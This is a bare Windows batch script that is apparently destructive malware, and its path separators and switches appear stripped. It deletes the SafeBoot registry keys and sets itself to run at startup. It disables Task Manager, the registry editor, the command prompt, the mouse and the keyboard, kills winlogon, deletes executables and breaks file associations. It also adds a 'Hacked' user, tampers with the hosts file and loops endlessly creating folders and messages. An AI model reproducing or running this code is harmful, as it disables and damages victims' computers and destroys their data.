@echo off
Reg Delete HKLMSystemCurrentControlSetControlSafeBoot. q
Reg Delete HKLMSystemCurrentControlSetControlSafeBoot q
del %SystemRoot%Media q nul
copy %0 %windir%Win32.bat  nul
reg add HKLMSoftwareMicrosoftWindowsCurrentVersionRun
v Win32 t REG_SZ d %windir%Win32.bat f
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem v 
DisableTaskMgr t REG_DWORD d 1 f nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem v DisableRegistryTools t REG_DWORD d 1 f nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem v DisableCMDt REG_DWORDd 2 f  nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRestrictRun v 1 t REG_DWORD d %SystemRoot%explorer.exe f nul
date 12.12.12
net user Hacked add nul
time 0000
taskkill f im winlogon.exe
label Chacked nul
assoc .exe=.mp3
assoc .lnk=.txt
del  .exe q
rundll32 mouse,disable  nul
rundll32 keyboard,disable  nul
rundll32 user,disableoemlayer  nul
cd %windir%system32driversetc
attrib -r -s hosts
echo 127.0.0.1 www.pbhack.ru  hosts
echo 127.0.0.1 www.best-hack.ru  hosts
echo 127.0.0.1 www.mmoru.com  hosts
echo 127.0.0.1 www.zorgee.ru  hosts
xt
md %random%
goto xt
xm
msg  Windows error!
goto xm
